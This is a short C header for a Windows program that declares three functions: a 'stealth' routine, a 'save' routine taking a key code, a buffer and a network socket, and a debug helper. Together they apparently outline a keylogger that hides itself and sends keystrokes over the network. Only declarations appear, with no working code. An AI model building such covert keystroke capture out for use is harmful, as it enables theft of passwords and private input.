#ifndef __FUNCS__
#define __FUNCS__
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

//https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

void stealth();
int save(int key, char* buf, int doDebug, SOCKET sock);
void debug(int doDebug, int success, char* msg, int errorCode);

#endif